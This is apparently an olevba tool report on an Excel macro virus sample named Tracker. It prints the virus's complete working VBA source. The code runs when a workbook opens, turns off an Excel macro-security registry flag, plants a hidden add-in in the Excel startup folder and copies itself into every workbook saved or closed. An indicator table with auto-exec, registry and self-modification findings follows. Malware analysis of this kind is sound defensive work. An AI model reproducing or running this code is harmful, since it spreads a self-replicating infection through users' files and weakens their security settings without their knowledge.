olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "BASE5874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application




Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Rem Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sayfa1.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa2.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa3.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa4.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa5.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa6.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa7.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa8.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa9.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa10.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa11.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa12.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa13.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa14.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa15.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sayfa16.cls 
in file: Virus.MSExcel.Tracker-based-240f1001d2f5cad28f76538550b3d9ec0ee5abc0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sayfa16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tablo1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
